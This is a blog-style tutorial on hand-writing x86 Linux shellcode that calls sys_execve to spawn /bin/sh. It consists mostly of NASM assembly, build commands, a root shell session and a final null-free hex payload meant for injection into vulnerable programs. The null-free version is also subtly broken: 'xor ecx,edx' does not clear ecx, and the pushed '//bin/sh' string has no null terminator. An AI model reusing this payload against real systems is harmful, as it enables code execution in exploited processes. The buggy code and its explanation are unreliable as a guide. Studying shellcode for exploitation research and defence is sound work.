---
layout: post
title:  "Creating a simple x86 shellcode"
date:   2017-09-17 01:51:00
disqus: true
categories: Reversing
---
<b><font color="red">I'm using a x64 linux to do this</font></b>

It's a simple x86 shellcode to call /bin/sh, but the first thing is understand how the sys_execve works, to do so you can access this <a href="https://syscalls.kernelgrok.com/" target="_blank">site</a> that gives to you a list with all the x86 syscalls, and the values you need to put in each register, just search for sys_execve.

The initial code bellow have all the comments to make it easy to understand how to use the sys_execve,

{% highlight Bash %}
section .data:
	cmd: db "/bin/sh",0x0
section .text:
	global _start
	_start:
		mov eax,0x0b	;use sys_execve
		mov ebx,cmd	;first arg, file to execute
		mov edx,0x0	;first parameter no usage
		mov ecx,0x0	;second parameter no usage
		int 0x80	;kernel interrupt
{% endhighlight %}

Just to test this code, lets compile it, link and execute the binary shell to get the /bin/sh

{% highlight Bash %}
root@demoniware:~/shellcode# nasm -f elf32 sh3llc0d3.asm && ld -m elf_i386 -s -o shell sh3llc0d3.o
root@demoniware:~/shellcode# ./shell
# id
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

But this code is not nullbyte free and it's a problem when we are working with shellcodes, so with some work I got this code,

{% highlight Bash %}
section .text:
	global _start
	_start:
		push ebp		;prologue
		mov ebp,esp		;prologue
		sub esp,10		;reserve 10 bytes on stack
		push 0x68732f6e		;send hs/n to stack
		push 0x69622f2f		;send ib// to stack
		xor eax,eax		;zero to eax
		add eax,0x0b		;add 0x0b on eax to call sys_execve
		mov ebx,esp		;mov //bin/sh(hs/nib//) to ebx
		xor edx,edx		;zero to edx first arg
		xor ecx,edx		;zero ecx second arg
		int 0x80		;kernel interrupt
{% endhighlight %}

To confirm if my code is free of nullbytes, I used this site <a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank">defuse.ca</a>, that translate asm instructions to opcodes or just use objdump, and now I have a shellcode free of nullbytes with 23 bytes because the shellcode does not need the prologue

{% highlight Bash %}
\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x31\xc0\x83\xc0\x0b\x89\xe3\x31\xd2\x31\xd1\xcd\x80
{% endhighlight %}
